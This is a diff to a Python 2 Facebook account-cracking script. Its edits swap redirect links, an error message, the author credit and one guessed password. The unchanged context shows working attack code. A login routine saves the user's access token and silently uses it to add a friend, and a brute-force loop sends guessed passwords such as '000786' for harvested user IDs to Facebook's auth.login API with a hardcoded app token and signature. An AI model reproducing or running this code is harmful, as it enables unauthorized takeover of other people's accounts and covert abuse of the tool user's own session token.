@@ -117,10 +117,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 
 def login():
 	os.system('clear')
@@ -141,7 +141,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;91mThere is no internet connection"
+			print"\n\x1b[1;91mMeri Jan Internet Connection Problem He"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -164,7 +164,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -206,7 +206,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;91mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Omi_Ch
+	os.system("clear") #Dev:Arbab-Memon
 	print logo
 	print "  \033[1;97m«---------\033[1;95mLogged in User Info\033[1;97m---------»"
 	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
@@ -379,7 +379,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Pakistan1'
+													pass6 = '000786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
